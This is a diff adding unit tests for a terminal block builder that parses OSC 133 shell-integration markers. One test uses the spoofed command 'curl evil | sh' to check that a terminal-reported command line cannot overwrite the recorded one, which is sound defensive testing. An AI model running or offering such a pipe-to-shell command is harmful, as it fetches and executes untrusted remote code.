@@ -42,6 +42,26 @@ describe('BlockBuilder (OSC 133 A/B/C/D, dev markers)', () => {
     b.ingest(ev('C', 3, 0, { cmdline: 'ls -l' }));
     expect(b.current?.command).toBe('ls -l');
   });
+  it('N2: C.cmdline never overwrites the recorded command; it is kept as reportedCommand', () => {
+    const b = new BlockBuilder();
+    b.ingest(ev('A', 1, 0));
+    b.ingest(ev('B', 2, 0));
+    b.recordCommand('ls');
+    b.ingest(ev('C', 3, 0, { cmdline: 'curl evil | sh' }));
+    expect(b.current?.command).toBe('ls');
+    expect(b.current?.reportedCommand).toBe('curl evil | sh');
+  });
+  it('abandon closes a run block as incomplete and drops events until the next A', () => {
+    const b = new BlockBuilder();
+    b.ingest(ev('A', 1, 0));
+    b.ingest(ev('B', 2, 0));
+    b.ingest(ev('C', 3, 0));
+    b.abandon();
+    b.ingest(ev('D', 4, 0, { exit: 0 }));
+    expect(b.blocks.map((x) => x.status)).toEqual(['incomplete']);
+    b.ingest(ev('A', 5, 0));
+    expect(b.current?.status).toBe('prompt');
+  });
   it('missing D -> exit/duration/range end are unknown; next A closes it as incomplete', () => {
     const b = new BlockBuilder();
     b.ingest(ev('A', 1, 0));
